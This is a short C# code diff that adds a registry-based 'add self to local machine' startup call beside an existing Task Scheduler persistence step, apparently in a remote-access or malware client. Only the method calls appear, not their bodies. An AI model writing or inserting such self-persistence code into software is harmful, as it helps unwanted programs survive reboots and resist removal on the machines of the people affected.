@@ -65,6 +65,7 @@ namespace Client
 
                     // always creates the taskscheduler task, replace if exists
                     Armitage.Startup.Task_Scheduler.ViaTaskScheduler(Constants.WinDirTaskName);
+                    Armitage.Startup.Via_Registry.AddSelfToLocalMachine();
 
                     // needs to be a separate if to get called after creating the task
                     if (Armitage.Startup.Task_Scheduler.IsTaskExists(Constants.WinDirTaskName))
